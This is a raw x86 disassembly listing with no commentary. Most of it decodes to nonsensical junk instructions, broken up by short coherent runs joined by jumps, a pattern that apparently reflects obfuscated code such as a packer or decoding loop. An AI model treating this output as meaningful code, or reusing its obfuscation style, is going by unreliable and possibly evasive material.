  406a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a7b:	dec    eax
  406a7c:	cmp    al,0xb2
  406a7e:	sub    eax,0xd3975d10
  406a83:	add    al,0x74
  406a85:	and    BYTE PTR [ebx],cl
  406a87:	lods   eax,DWORD PTR ds:[esi]
  406a88:	cwde   
  406a89:	jne    0x406aeb
  406a8b:	in     al,0x62
  406a8d:	and    BYTE PTR [edi+0x1e],bl
  406a90:	xchg   ebx,eax
  406a91:	xchg   BYTE PTR [edi],dh
  406a93:	dec    ebx
  406a94:	mov    BYTE PTR ds:0xb2c98863,dh
  406a9a:	xchg   edi,eax
  406a9b:	inc    DWORD PTR ds:0x2963e046
  406aa1:	data16 sbb bl,BYTE PTR [ebx]
  406aa4:	pop    edx
  406aa5:	xchg   DWORD PTR [edi-0x75],eax
  406aa8:	sbb    BYTE PTR [edx-0x5a],ch
  406aab:	outs   dx,DWORD PTR ds:[esi]
  406aac:	xchg   esp,eax
  406aad:	clc    
  406aae:	sub    BYTE PTR [ebp-0x3a],bl
  406ab1:	into   
  406ab2:	push   esp
  406ab3:	inc    edi
  406ab4:	xchg   esp,eax
  406ab5:	gs cmc 
  406ab7:	fimul  DWORD PTR [esi]
  406ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406aba:	xchg   esi,eax
  406abb:	int    0xa7
  406abd:	in     eax,0xcb
  406abf:	stc    
  406ac0:	stos   BYTE PTR es:[edi],al
  406ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac2:	stos   BYTE PTR es:[edi],al
  406ac3:	lods   al,BYTE PTR ds:[esi]
  406ac4:	and    edx,DWORD PTR [ebp+0x29]
  406ac7:	pop    ss
  406ac8:	ja     0x406ada
  406aca:	std    
  406acb:	mov    cs,WORD PTR [eax+0x6bf441e6]
  406ad1:	out    dx,al
  406ad2:	iret   
  406ad3:	shl    BYTE PTR [edx],cl
  406ad5:	stc    
  406ad6:	test   ah,0xa1
  406ad9:	loope  0x406a5d
  406adb:	sbb    ebx,DWORD PTR [edi-0x56eab6b4]
  406ae1:	ins    BYTE PTR es:[edi],dx
  406ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ae3:	or     BYTE PTR [ecx],0x4b
  406ae6:	or     eax,0xdb567e21
  406aeb:	loope  0x406ae3
  406aed:	pusha  
  406aee:	(bad)  
  406aef:	fadd   st(6),st
  406af1:	mov    DWORD PTR ds:0xbbe5b365,esi
  406af7:	sahf   
  406af8:	dec    ebp
  406af9:	add    eax,0x126801e8
  406afe:	sets   BYTE PTR [ebp-0x3f65408b]
  406b05:	loop   0x406b48
  406b07:	push   cs
  406b08:	fst    QWORD PTR [ebp-0x80]
  406b0b:	test   al,0xb1
  406b0d:	sbb    DWORD PTR [edi+0x13426d77],0xffffff86
  406b14:	mov    eax,ds:0x19493b7f
  406b19:	nop
  406b1a:	cmp    edi,DWORD PTR [eax]
  406b1c:	ins    DWORD PTR es:[edi],dx
  406b1d:	fisubr WORD PTR [ebp+0x51]
  406b20:	scas   al,BYTE PTR es:[edi]
  406b21:	cmp    al,0x9f
  406b23:	xlat   BYTE PTR ds:[ebx]
  406b24:	dec    DWORD PTR [ebx+edi*2+0x23]
  406b28:	enter  0x5d2e,0x4
  406b2c:	stc    
  406b2d:	mov    bl,0x64
  406b2f:	cmc    
  406b30:	push   ebp
  406b31:	adc    BYTE PTR [ebp+0x1b],cl
  406b34:	jne    0x406ba3
  406b36:	or     al,0x4f
  406b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b39:	jg     0x406b1c
  406b3b:	or     DWORD PTR [edi+0x2e0d6f73],esi
  406b41:	call   0x72f3a869
  406b46:	cmp    BYTE PTR [esi-0x5e396c3e],dh
  406b4c:	xchg   esi,eax
  406b4d:	add    edx,ecx
  406b4f:	jmp    0x406fb2
  406b54:	mov    edx,DWORD PTR [ebp-0x18]
  406b57:	xor    edx,eax
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax-0x361ce7ef],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b70
  406b8f:	int3   
  406b90:	clc    
  406b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b92:	outs   dx,DWORD PTR ds:[esi]
  406b93:	(bad)  
  406b94:	int    0x2f
  406b96:	inc    edx
  406b97:	sahf   
  406b98:	add    ebx,DWORD PTR [edi+eiz*8]
  406b9b:	retf   0xc727
  406b9e:	pop    ebx
  406b9f:	mov    bh,0xfe
  406ba1:	xchg   BYTE PTR [ecx*4+0x5ca9f6d8],dh
  406ba8:	aas    
  406ba9:	mov    ds,WORD PTR fs:[ebp-0x3448310f]
  406bb0:	mov    DWORD PTR [eax+0x7ba4cb5c],ecx
  406bb6:	mov    gs,esi
  406bb8:	jp     0x406bf5
  406bba:	pop    ebx
  406bbb:	ret    0x4f95
  406bbe:	push   eax
  406bbf:	dec    eax
  406bc0:	aaa    
  406bc1:	and    BYTE PTR [esi+0xada334],bl
  406bc7:	dec    esp
  406bc8:	push   ds
  406bc9:	pop    ecx
  406bca:	inc    ebx
  406bcb:	loopne 0x406bea
  406bcd:	lods   al,BYTE PTR ds:[esi]
  406bce:	fwait
  406bcf:	xchg   ebp,eax
  406bd0:	sub    ecx,DWORD PTR [esi-0x6e]
  406bd3:	cmp    ah,BYTE PTR [edx]
  406bd5:	xor    al,0x15
  406bd7:	mov    ds:0x1f754770,al
  406bdc:	xchg   esp,eax
  406bdd:	aas    
  406bde:	jmp    0x406c43
  406be0:	inc    ebx
  406be1:	mov    gs,WORD PTR [esi+0x298487fb]
  406be7:	retf   0xbf15
  406bea:	or     eax,0x985045d0
  406bef:	sbb    ah,BYTE PTR [ecx+edx*1-0x52c08c1d]
  406bf6:	cmp    DWORD PTR [ebx],edx
  406bf8:	shl    BYTE PTR [ebx-0x71],1
  406bfb:	mov    dl,0xed
  406bfd:	aam    0x1a
  406bff:	lods   al,BYTE PTR ds:[esi]
  406c00:	xchg   esi,eax
  406c01:	jecxz  0x406bde
  406c03:	push   0x2a03b540
  406c08:	jmp    0xca6:0xfc91144d
  406c0f:	mov    dl,0xac
  406c11:	mov    ecx,0x2250d685
  406c16:	mov    esp,0x346ff5d7
  406c1b:	mov    bl,0x2a
  406c1d:	hlt    
  406c1e:	ret    0x2b38
  406c21:	dec    ecx
  406c22:	sbb    al,bh
  406c24:	popa   
  406c25:	xor    DWORD PTR [edx-0x20],ebx
  406c28:	inc    ecx
  406c29:	or     ecx,DWORD PTR [ecx-0x34]
  406c2c:	lds    ebp,FWORD PTR [edx+0xe]
  406c2f:	jmp    0x28b470d3
  406c34:	and    eax,0x5e197a70
  406c39:	imul   ebx,DWORD PTR [ebx],0x6a7f5304
  406c3f:	inc    ecx
  406c40:	pushf  
  406c41:	stos   BYTE PTR es:[edi],al
  406c42:	pop    esp
  406c43:	jo     0x406cc0
  406c45:	aam    0x74
  406c47:	xor    bh,al
  406c49:	or     dl,BYTE PTR [ecx-0x1d]
  406c4c:	mul    BYTE PTR [esi+0x43]
  406c4f:	mov    bh,ah
  406c51:	lea    esp,[edx-0x2c]
  406c54:	lds    esi,FWORD PTR [edi-0x5e]
  406c57:	xor    BYTE PTR [ebp-0x1fe8ac44],ah
  406c5d:	mov    ah,0xbe
  406c5f:	push   es
  406c60:	and    BYTE PTR ds:[ecx-0x2ee33958],cl
  406c67:	aaa    
  406c68:	repz push ss
  406c6a:	and    al,0x1a
  406c6c:	nop
  406c6d:	jbe    0x406c8e
  406c6f:	(bad)  
  406c70:	js     0x406c26
  406c72:	sbb    BYTE PTR ds:0xe6068a0a,ch
  406c78:	test   dl,bl
  406c7a:	(bad)  
  406c7b:	imul   ebp,esi,0x7
  406c7e:	sbb    eax,0x4d2578b8
  406c83:	out    0x1d,al
  406c85:	stos   DWORD PTR es:[edi],eax
  406c86:	inc    edx
  406c87:	jmp    0xb71038a7
  406c8c:	mov    edx,0x3c4aab3d
  406c91:	push   edx
  406c92:	test   al,0x62
  406c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c95:	aaa    
  406c96:	sbb    al,BYTE PTR [eax+0x46]
  406c99:	cwde   
  406c9a:	stos   BYTE PTR es:[edi],al
  406c9b:	(bad)  
  406c9c:	push   esi
  406c9d:	push   eax
  406c9e:	adc    al,0x60
  406ca0:	stc    
  406ca1:	pop    es
  406ca2:	loop   0x406c49
  406ca4:	or     bl,dh
  406ca6:	dec    ebp
  406ca7:	call   0x4a0e:0x290ea56c
  406cae:	jl     0x406cbe
  406cb0:	in     eax,0x53
  406cb2:	sti    
  406cb3:	repz pop esp
  406cb5:	inc    esi
  406cb6:	mov    esp,0x7eff0dcc
  406cbb:	xchg   BYTE PTR [ebp-0x2015cd27],dh
  406cc1:	out    0xb0,al
  406cc3:	mov    edi,DWORD PTR [ebp-0x1c]
  406cc6:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406ccd:	mov    BYTE PTR [ebp+0xb],dl
  406cd0:	mov    dl,BYTE PTR [ebp+0xf]
  406cd3:	mov    edi,DWORD PTR [ebp-0xc]
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss aam 0x98
  406cf1:	(bad)  [ebp-0x6c]
  406cf4:	pop    es
  406cf5:	jle    0x406d75
  406cf7:	and    edi,DWORD PTR [edi+0x7e]
  406cfa:	jle    0x406cc3
  406cfc:	xchg   ebx,esp
  406cfe:	ficom  WORD PTR [eax]
  406d00:	mov    dh,0x9e
  406d02:	cmp    DWORD PTR [edx-0x1189ea9f],eax
  406d08:	test   al,0x2c
  406d0a:	and    eax,DWORD PTR [edx-0x48]
  406d0d:	pop    esp
  406d0e:	push   ecx
  406d0f:	jle    0x406cb5
  406d11:	fisubr WORD PTR [bp+di-0x6081]
  406d16:	and    BYTE PTR [ebx-0x4c],0xc1
  406d1a:	std    
  406d1b:	add    ah,BYTE PTR [ebx-0x7af3a64b]
  406d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d22:	mov    ebp,0x9ca4443a
  406d27:	xchg   ecx,eax
  406d28:	pop    esi
  406d29:	shl    BYTE PTR [eax-0x7f],cl
  406d2c:	(bad)  
  406d2d:	cmc    
  406d2e:	dec    edi
  406d2f:	jae    0x406d66
  406d31:	cdq    
  406d32:	xchg   BYTE PTR [ebp+0x72],ch
  406d35:	enter  0xfea4,0x5d
  406d39:	test   DWORD PTR [edi-0x66],edi
  406d3c:	fdivr  QWORD PTR [edi]
  406d3e:	loop   0x406d0a
  406d40:	dec    ebp
  406d41:	out    0x99,eax
  406d43:	xchg   edi,eax
  406d44:	inc    ebp
  406d45:	test   eax,edi
  406d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d48:	test   BYTE PTR [ecx+eax*8-0x13],al
  406d4c:	nop
  406d4d:	into   
  406d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d4f:	icebp  
  406d50:	mov    WORD PTR [ebp-0x623245b8],ds
  406d56:	dec    edi
  406d57:	ja     0x406db8
  406d59:	dec    edx
  406d5a:	jns    0x406dd7
  406d5c:	xor    DWORD PTR [esi+0x4d],edi
  406d5f:	ja     0x406d26
  406d61:	mov    ds:0x9410cdc4,eax
  406d66:	mov    dl,0x54
  406d68:	xor    BYTE PTR [edx],al
  406d6a:	pop    eax
  406d6b:	lahf   
  406d6c:	mov    DWORD PTR [ebp-0x1a],ebx
  406d6f:	mov    dh,0xc8
  406d71:	outs   dx,BYTE PTR ds:[esi]
  406d72:	test   eax,0xbef655dc
  406d77:	adc    al,0x25
  406d79:	iret   
  406d7a:	gs add al,0xe5
  406d7d:	xlat   BYTE PTR ds:[ebx]
  406d7e:	or     dl,BYTE PTR [ecx-0x1b0e7d6f]
  406d84:	loopne 0x406d5d
  406d86:	lock mov eax,ds:0x5a79ef8b
  406d8c:	(bad)  
  406d8d:	xor    BYTE PTR [esi-0x58ed9778],al
  406d93:	into   
  406d94:	scas   al,BYTE PTR es:[edi]
  406d95:	pop    es
  406d96:	arpl   sp,bx
  406d98:	in     eax,dx
  406d99:	jmp    0x5cf5:0x249f65f5
  406da0:	sub    eax,0xba41ad51
  406da5:	fnstsw WORD PTR ds:0x144e431f
  406dab:	mov    WORD PTR [edi-0x8],gs
  406dae:	mov    eax,DWORD PTR [edi+0x72]
  406db1:	cdq    
  406db2:	pop    ebx
  406db3:	inc    esi
  406db4:	and    al,0x4d
  406db6:	xor    esi,DWORD PTR [eax+0x3d]
  406db9:	mov    eax,ds:0x3f5d818d
  406dbe:	sbb    al,0x99
  406dc0:	retf   
  406dc1:	mov    eax,ds:0x42d861c4
  406dc6:	lea    ecx,[esi+0x35]
  406dc9:	adc    eax,0x359bcbe7
  406dce:	mov    ebp,0x22e268a4
  406dd3:	and    DWORD PTR [ebx+0x7a684b09],0xffffff9f
  406dda:	push   edi
  406ddb:	ret    0x2199
  406dde:	mov    eax,ds:0xe5a8d06c
  406de3:	and    ebp,DWORD PTR [edi+0x4553f01f]
  406de9:	cmp    al,bh
  406deb:	retf   0xc9b6
  406dee:	out    0x3b,al
  406df0:	add    BYTE PTR [eax-0x4f],0x3c
  406df4:	sar    BYTE PTR [edi-0x49],1
  406df7:	push   ebp
  406df8:	cli    
  406df9:	in     eax,dx
  406dfa:	sbb    al,BYTE PTR [ebx-0x2e]
  406dfd:	test   BYTE PTR [edx-0x58],al
  406e00:	stos   BYTE PTR es:[edi],al
  406e01:	ds push edx
  406e03:	cmc    
  406e04:	pop    edx
  406e05:	repz mov es,eax
  406e08:	cdq    
  406e09:	xor    BYTE PTR [ecx-0x20c6d36e],0x93
  406e10:	popa   
  406e11:	mov    eax,ds:0xc45e97c5
  406e16:	or     al,0x35
  406e18:	jmp    0x6cfc0281
  406e1d:	jl     0x406df5
  406e1f:	mov    cl,0x9a
  406e21:	inc    esp
  406e22:	(bad)  
  406e24:	lahf   
  406e25:	mov    ebp,ebp
  406e27:	pushf  
  406e28:	inc    edx
  406e29:	or     DWORD PTR ds:0x5ab74f0f,edx
  406e2f:	add    BYTE PTR [eax+0x729f1f94],cl
  406e35:	xor    al,BYTE PTR [eax]
  406e37:	jmp    0x406f89
  406e3c:	jns    0x406e62
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	jno    0x406e9a
  406e4a:	inc    esi
  406e4b:	aad    0x59
  406e4d:	add    al,0x7e
  406e4f:	jle    0x406e74
  406e51:	jg     0x406ed1
  406e53:	jle    0x406ea4
  406e55:	in     eax,0x86
  406e57:	cmp    eax,0xc6e58f39
  406e5c:	mov    edi,0xef0e1ca9
  406e61:	add    eax,0xa3c4b31
  406e66:	pop    es
  406e67:	cli    
  406e68:	sub    DWORD PTR [bp+0x56],0xfffffff4
  406e6d:	and    esi,esp
  406e6f:	mov    bl,0x69
  406e71:	pop    edi
  406e72:	adc    esi,ebx
  406e74:	stos   DWORD PTR es:[edi],eax
  406e75:	jno    0x406eaa
  406e77:	mov    ds,WORD PTR ds:0xbb1babb8
  406e7d:	and    ebp,ebx
  406e7f:	cld    
  406e80:	test   al,0xd7
  406e82:	cmp    bl,BYTE PTR [esi]
  406e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e85:	xor    al,0x6c
  406e87:	push   ecx
  406e88:	shl    DWORD PTR [ebx],0xa8
  406e8b:	sbb    DWORD PTR [ebp-0x1b],ecx
  406e8e:	popf   
  406e8f:	nop
  406e90:	outs   dx,DWORD PTR ds:[esi]
  406e91:	or     esi,esi
  406e93:	xchg   esi,eax
  406e94:	repz pop edi
  406e96:	and    al,0xba
  406e98:	cmp    eax,0x9de9f39c
  406e9d:	xor    BYTE PTR [esi+0x44],ah
  406ea0:	es (bad) 
  406ea2:	fldenv [eax-0x19]
  406ea5:	fst    QWORD PTR [edi-0x1c]
  406ea8:	mov    al,ds:0xd0d633d3
  406ead:	mov    ds:0xfb655b3a,eax
  406eb2:	adc    DWORD PTR [ebx+0x2c],0x27
  406eb6:	push   0xffffffda
  406eb8:	adc    ch,BYTE PTR [edx-0x3d]
  406ebb:	cs cmc 
  406ebd:	lock mov ebp,0x30ff59e2
  406ec3:	test   esp,esp
  406ec5:	fidivr WORD PTR [eax+0x5fa22aa7]
  406ecb:	and    eax,0xdea4c048
  406ed0:	or     ecx,DWORD PTR [edx+0x36a0ce37]
  406ed6:	std    
  406ed7:	cmp    esp,DWORD PTR [ecx+0x3c]
  406eda:	ss jnp 0x406e98
  406edd:	inc    ecx
  406ede:	sbb    ebp,DWORD PTR [ebx*8+0xafccaeb]
  406ee5:	mov    eax,ds:0x4d9b79a
  406eea:	clc    
  406eeb:	pop    ebx
  406eec:	mov    cs,WORD PTR cs:[edx+0x52]
  406ef0:	or     esp,esp
  406ef2:	fwait
  406ef3:	ret    
  406ef4:	adc    eax,0x52bb8515
  406ef9:	sbb    al,0xb7
  406efb:	sub    al,BYTE PTR [ebx+eax*1]
  406efe:	stos   DWORD PTR es:[edi],eax
  406eff:	icebp  
  406f00:	sar    DWORD PTR [eax-0x2f],0xe5
  406f04:	add    ch,ah
  406f06:	ins    DWORD PTR es:[edi],dx
  406f07:	jecxz  0x406f53
  406f09:	adc    ebx,DWORD PTR [edi]
  406f0b:	inc    esi
  406f0c:	push   edi
  406f0d:	inc    ebx
  406f0e:	xor    ch,bh
  406f10:	pop    ds
  406f11:	sub    DWORD PTR [ebp-0x6c],0xe92bd124
  406f18:	xor    BYTE PTR [esi+0x200d5e8a],ch
  406f1e:	into   
  406f1f:	inc    ebp
  406f20:	mov    esi,DWORD PTR [eax-0x5c]
  406f23:	out    dx,eax
  406f24:	or     eax,0x469d5705
  406f29:	cmp    BYTE PTR [edx-0x67],0xf9
  406f2d:	mov    dh,0xd
  406f2f:	iret   
  406f30:	fldcw  WORD PTR [esi-0x707800f]
  406f36:	sahf   
  406f37:	mov    dl,0x9f
  406f39:	or     dl,bh
  406f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f3c:	aas    
  406f3d:	in     al,dx
  406f3e:	aaa    
  406f3f:	or     al,0x94
  406f41:	ja     0x406f63
  406f43:	pop    ds
  406f44:	mov    bh,0x2d
  406f46:	scas   al,BYTE PTR es:[edi]
  406f47:	add    edx,eax
  406f49:	adc    ch,BYTE PTR [ebx]
  406f4b:	and    eax,DWORD PTR ss:[edx+eax*1]
  406f4f:	or     eax,0xeccff769
  406f54:	out    dx,al
  406f55:	push   edi
  406f56:	xchg   ecx,edi
  406f58:	mov    ds:0x3c6857ba,al
  406f5d:	push   ebp
  406f5e:	mov    bl,0x34
  406f60:	cs scas al,BYTE PTR es:[edi]
  406f62:	fs push edi
  406f64:	enter  0x6233,0xbc
  406f68:	mov    dh,0x5c
  406f6a:	xchg   esi,eax
  406f6b:	cmp    ecx,ecx
  406f6d:	sbb    eax,eax
  406f6f:	xlat   BYTE PTR ds:[ebx]
  406f70:	ror    ebp,1
  406f72:	imul   edx,DWORD PTR [ebp-0x48],0xf505d2e
  406f79:	lock jmp 0x406f33
  406f7c:	mov    ebx,esp
  406f7e:	repz jmp 0x3f28:0xa94c59f3
  406f86:	add    eax,0x558a7048
  406f8b:	or     ecx,DWORD PTR [ebx-0x7cc1783]
  406f91:	add    edi,DWORD PTR [ebp-0x14]
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407010:	cwde   
  407011:	jns    0x40702d
  407013:	add    bl,BYTE PTR [edx]
  407015:	jle    0x407095
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x407022
  40701c:	fwait
  40701d:	push   eax
  40701e:	or     al,0x52
  407020:	fs mov ah,0x4
  407023:	add    edx,DWORD PTR [eax]
  407025:	mov    bh,0xa
  407027:	jge    0x406fda
  407029:	call   0xfd10db4f
  40702e:	cs xchg edi,ebx
  407031:	dec    eax
  407032:	or     al,0x82
  407034:	iret   
  407035:	jg     0x4070b4
  407037:	jne    0x407068
  407039:	dec    edx
  40703a:	shl    DWORD PTR [edx],cl
  40703c:	das    
  40703d:	or     cl,BYTE PTR [ecx+eax*1+0x40bbfa76]
  407044:	jmp    0x282d51a6
  407049:	popf   
  40704a:	ret    0xe176
  40704d:	ret    
  40704e:	int3   
  40704f:	popf   
  407050:	ucomiss xmm4,xmm2
  407053:	test   al,0x2f
  407055:	repnz and BYTE PTR [ebx+ebx*2-0x56],0x6f
  40705b:	out    dx,al
  40705c:	or     dh,BYTE PTR [edx-0x3a7e3f92]
  407062:	sbb    DWORD PTR [ecx],ebx
  407064:	sbb    edx,0x29
  407067:	push   0xf76d308b
  40706c:	inc    esp
  40706d:	mul    DWORD PTR ds:0x1c2f588
  407073:	jmp    0xf5b258b8
  407078:	jge    0x407038
  40707a:	popa   
  40707b:	lods   eax,DWORD PTR ds:[esi]
  40707c:	mov    ch,BYTE PTR [ebx]
  40707e:	int    0x7d
  407080:	call   0xb954:0x43d17755
  407087:	add    BYTE PTR [eax],bh
  407089:	pusha  
  40708a:	in     eax,0x92
  40708c:	xchg   edi,eax
  40708d:	cmp    ecx,DWORD PTR [edx-0x71]
  407090:	clc    
  407091:	mov    DWORD PTR [ebx],ebx
  407093:	in     al,0x9f
  407095:	mov    eax,0x5c26add2
  40709a:	popf   
  40709b:	mov    al,0xa4
  40709d:	in     al,0xe0
  40709f:	(bad)  
  4070a0:	sbb    bh,BYTE PTR [eax-0x1a]
  4070a3:	inc    ebp
  4070a4:	jmp    0xbd34:0x9c836139
  4070ab:	cmp    DWORD PTR [edx],ecx
  4070ad:	mov    bl,0xaa
  4070af:	lahf   
  4070b0:	sbb    DWORD PTR [eax],esi
  4070b2:	mov    esi,0xb3fb6d56
  4070b7:	mov    bh,0x6b
  4070b9:	imul   eax,DWORD PTR [eax],0xffffffa0
  4070bc:	jne    0x4070e2
  4070be:	mov    al,0xc4
  4070c0:	pop    edi
  4070c1:	cmp    dl,dh
  4070c3:	ja     0x40708c
  4070c5:	jbe    0x40707a
  4070c7:	or     dl,cl
  4070c9:	stos   BYTE PTR es:[edi],al
  4070ca:	test   DWORD PTR [ebp+0x36],edx
  4070cd:	shl    BYTE PTR [eax-0x23],0x7f
  4070d1:	popa   
  4070d2:	mov    esp,0x4f93986e
  4070d7:	sub    bh,BYTE PTR [ebx-0x42]
  4070da:	push   ebp
  4070db:	pusha  
  4070dc:	shl    BYTE PTR [edx-0x3a],0x2f
  4070e0:	or     eax,0xcbbeebce
  4070e5:	je     0x407088
  4070e7:	loope  0x407155
  4070e9:	pop    esi
  4070ea:	aam    0x2
  4070ec:	add    BYTE PTR [eax-0x4f],ch
  4070ef:	mov    dl,0x44
  4070f1:	cmp    DWORD PTR [edx],ebp
  4070f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070f4:	sub    BYTE PTR [ebx+eiz*2],bl
  4070f7:	lock push edx
  4070f9:	iret   
  4070fa:	push   eax
  4070fb:	inc    esp
  4070fc:	and    DWORD PTR [eax],0xffffff89
  4070ff:	xchg   DWORD PTR [eax+eiz*1+0xe],ebp
  407103:	jmp    0x407162
  407105:	jle    0x407186
  407107:	in     eax,dx
  407108:	ret    0xe605
  40710b:	lock daa 
  40710d:	pop    ss
  40710e:	test   eax,0x219bb9a7
  407113:	add    eax,0xc90cca7d
  407118:	cli    
  407119:	icebp  
  40711a:	xchg   ecx,eax
  40711b:	imul   ebp,DWORD PTR [ebp-0x4f27d5ba],0x24
  407122:	repnz pusha 
  407124:	fstp   QWORD PTR [eax+0x76]
  407127:	ss cdq 
  407129:	push   ss
  40712a:	rcl    edi,1
  40712c:	test   BYTE PTR [ebx+ecx*8-0x4f],dh
  407130:	dec    edi
  407131:	pop    ss
  407132:	loope  0x407154
  407134:	inc    ebp
  407135:	imul   DWORD PTR gs:[esi*4-0x41e84146]
  40713d:	dec    ecx
  40713e:	sar    dh,cl
  407140:	sub    BYTE PTR [edx+0x1b],dl
  407143:	xchg   edx,eax
  407144:	ss mov edi,0x5a87d78e
  40714a:	pop    ebx
  40714b:	stos   BYTE PTR es:[edi],al
  40714c:	mov    eax,ds:0x31b0c52
  407151:	xlat   BYTE PTR ds:[ebx]
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0xe2
  407180:	mov    dl,0xb8
  407182:	inc    edx
  407183:	aaa    
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x40712a
  40718c:	jae    0x407129
  40718e:	mov    dh,0x4a
  407190:	sbb    ah,dh
  407192:	add    ebp,edx
  407194:	pop    edi
  407195:	arpl   di,si
  407197:	ret    0xa320
  40719a:	sub    al,0x9
  40719c:	pusha  
  40719d:	adc    eax,0xcc100701
  4071a2:	jl     0x407153
  4071a4:	mov    edx,0x8f3bf25d
  4071a9:	addr16 mov ch,0x18
  4071ac:	jg     0x407166
  4071ae:	stos   DWORD PTR es:[edi],eax
  4071af:	nop
  4071b0:	sub    bh,al
  4071b2:	cli    
  4071b3:	mov    BYTE PTR [ecx+0x28],bh
  4071b6:	or     ebx,ebx
  4071b8:	test   eax,0x4532e2e1
  4071bd:	mov    bh,0xae
  4071bf:	adc    eax,0xde8cfd2b
  4071c4:	xchg   BYTE PTR [eax+0xd2db70],cl
  4071ca:	daa    
  4071cb:	jno    0x4071e4
  4071cd:	jmp    0x407157
  4071cf:	or     DWORD PTR [esi+esi*8+0x5889a041],edi
  4071d6:	inc    esi
  4071d7:	addr16 cmc 
  4071d9:	add    dh,ch
  4071db:	ret    0xc869
  4071de:	(bad)  
  4071df:	fwait
  4071e0:	ret    0xd03e
  4071e3:	daa    
  4071e4:	mov    esi,0x63ff97b9
  4071e9:	dec    esi
  4071ea:	cs sti 
  4071ec:	adc    DWORD PTR ds:0x9493f58d,esi
  4071f2:	enter  0x6f1b,0x6
  4071f6:	arpl   ax,bx
  4071f8:	push   eax
  4071f9:	or     ebx,DWORD PTR [edx+0x2e]
  4071fc:	(bad)  
  4071fd:	(bad)  [esi+0x50]
  407200:	xchg   edi,eax
  407201:	xchg   ebp,eax
  407202:	stos   DWORD PTR es:[edi],eax
  407203:	xchg   DWORD PTR [eax-0x40],edx
